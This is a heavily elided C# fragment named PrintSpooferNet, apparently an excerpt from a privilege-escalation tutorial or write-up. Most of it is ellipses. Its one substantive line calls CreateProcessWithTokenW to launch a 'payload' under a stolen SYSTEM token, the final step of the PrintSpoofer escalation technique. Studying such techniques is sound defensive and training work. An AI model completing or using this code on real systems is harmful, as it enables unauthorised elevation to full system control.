...
namespace PrintSpooferNet
{
    ...
    class Program
    {
        ...
        static void Main(string[] args)
        {
            ...
            CreateProcessWithTokenW(hSystemToken, (uint)LogonFlags.WithProfile, null, payload, (uint)CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref si, out pi);
        }
    }
}
